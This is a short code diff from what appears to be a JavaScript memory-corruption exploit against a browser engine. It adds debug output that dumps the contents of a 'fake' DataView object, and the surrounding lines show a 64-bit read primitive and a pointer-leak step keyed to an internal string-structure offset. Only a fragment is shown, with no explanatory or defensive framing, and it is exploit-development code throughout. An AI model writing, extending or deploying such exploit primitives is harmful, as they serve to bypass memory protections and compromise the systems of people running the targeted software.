@@ -191,7 +191,10 @@ addEventListener('unhandledrejection', event => {
     const high = view.getUint32(offset + 4, true);
     return BigInt(low) + (BigInt(high) << 32n);
   }
- 
+log("[FAKE DV DUMP]");
+for (let i = 0; i < 0x40; i += 8) {
+    log(`Offset 0x${i.toString(16)}: 0x${dv.getBigUint64(i, true).toString(16)}`);
+}
   const leakPtr = read64(dv, off.strimpl_inline_str);
   log(`[+] Leaked pointer: ${hex(leakPtr)}`);
 
